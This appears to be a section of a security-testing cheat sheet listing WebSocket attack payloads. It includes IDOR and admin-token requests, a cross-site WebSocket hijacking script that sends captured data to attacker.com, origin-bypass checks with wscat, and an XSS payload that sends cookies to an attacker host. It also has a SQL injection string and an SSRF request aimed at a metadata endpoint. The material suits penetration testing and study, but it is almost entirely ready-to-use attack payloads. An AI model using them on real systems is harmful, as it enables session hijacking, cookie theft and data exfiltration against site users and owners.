## WEBSOCKET PAYLOADS

### IDOR / Auth Bypass
```javascript
// Test: subscribe to other user's channel
{"action": "subscribe", "channel": "user_VICTIM_ID_HERE"}
{"action": "get_history", "userId": "VICTIM_UUID"}
{"action": "getProfile", "id": 2}
{"action": "admin.listUsers"}
{"action": "admin.getToken", "userId": "1"}
```

### Cross-Site WebSocket Hijacking (CSWSH)
```html
<!-- Host on attacker site. If no Origin validation, steals victim's WS data. -->
<script>
var ws = new WebSocket('wss://target.com/ws');
// Browser automatically sends victim's cookies
ws.onopen = () => ws.send(JSON.stringify({action:"getProfile"}));
ws.onmessage = (e) => fetch('https://attacker.com/?d='+encodeURIComponent(e.data));
</script>
```

### Test Origin Validation
```bash
# Should reject non-target origins. If it doesn't = CSWSH vulnerability
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
wscat -c "wss://target.com/ws" -H "Origin: null"
wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
```

### Injection via WS Messages
```javascript
// XSS in chat/notification system
{"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}

// SQLi
{"action": "search", "query": "' OR 1=1--"}

// SSRF (if server fetches URLs from messages)
{"action": "preview", "url": "http://[REDACTED_IP]/latest/meta-data/"}
```

---

